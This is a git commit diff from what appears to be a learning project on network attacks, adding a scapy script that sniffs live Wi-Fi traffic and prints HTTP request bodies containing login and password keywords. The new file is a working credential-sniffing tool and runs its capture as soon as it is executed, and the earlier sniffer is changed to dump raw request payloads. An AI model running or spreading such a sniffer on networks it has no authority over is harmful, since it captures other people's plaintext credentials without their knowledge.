1c1ba2dc4515603b30479a8d0a941edc86228a28
gs1-maheswarane <maheswaran.elumalai@expeditors.com>
2025-03-18 08:43:31 +0530

    march17

--- 4packet-sniffer/3packet-sniffer-scapyhttp.py
+++ 4packet-sniffer/3packet-sniffer-scapyhttp.py
@@ -12,7 +12,10 @@ def sniff(interface):#
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet.show())
+        if packet.haslayer(scapy.Raw):
+            print(packet[scapy.Raw].load)
+# Here load is the field in Raw
+
 
 # find interfaces in windows using power shell; by using command - netsh interface show interface
 #
---
+++ 4packet-sniffer/5packet-sniffer-extractpwd.py
@@ -0,0 +1,40 @@
+#!/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+
+def sniff(interface):  #
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, )
+
+
+#if we want to filter different things, we can give : "udp" or "port 21" for ftp, "arp", "tcp" , "port 80" for webservers
+# now we need new module scapy-http to filter
+
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username", "user", "login", "password", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+
+
+# Here load is the field in Raw
+
+
+# find interfaces in windows using power shell; by using command - netsh interface show interface
+#
+#
+# PS C:\Users\gs1-maheswarane> netsh interface show interface
+#
+# Admin State    State          Type             Interface Name
+# -------------------------------------------------------------------------
+# Enabled        Disconnected   Dedicated        Ethernet
+# Enabled        Connected      Dedicated        Ethernet 4
+# Enabled        Disconnected   Dedicated        Wi-Fi
+
+
+#sniff("Ethernet 4")
+sniff("Wi-Fi")
